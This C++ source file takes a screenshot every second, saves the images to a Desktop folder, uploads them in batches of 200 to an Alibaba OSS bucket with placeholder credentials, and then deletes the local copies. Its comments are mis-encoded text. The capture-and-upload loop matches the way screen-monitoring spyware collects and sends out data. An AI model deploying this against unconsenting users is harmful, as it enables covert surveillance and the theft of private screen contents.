// main.cpp
#include "RedHorseCore.h"
#include <string>

// ��ʼ��OSS�˺���Ϣ
std::string Endpoint = "yourEndpoint"; 
std::string BucketName = "yourBucketName";
std::string ObjectName = "images";
std::string AccessKeyId = "yourAccessKeyId";
std::string AccessKeySecret = "yourAccessKeySecret";

int32_t wmain() {
    RedHorseCore::init();

    std::wstring baseDir = RedHorseCore::getUserProfile() + L"\\Desktop\\screenshot\\";

    for (int32_t i = 0; i < 2001; ++i) {
        std::wstring filename = baseDir + RedHorseCore::getCurrentTimestamp() + L".bmp";
        std::wcout << L"shooting " << filename << std::endl;
        RedHorseCore::ShootScreen(filename, NULL);
        Sleep(1000);

        // �ж��Ƿ���Է�����������OSS
        if (RedHorseCore::HasAtLeast200BmpFiles(baseDir)) {
            RedHorseCore::uploadFiles(BucketName, RedHorseCore::wstring_to_string(baseDir), Endpoint, AccessKeyId, AccessKeySecret);
            RedHorseCore::cleanFolder(baseDir); //����ļ���
        }
    }
    return 0;
}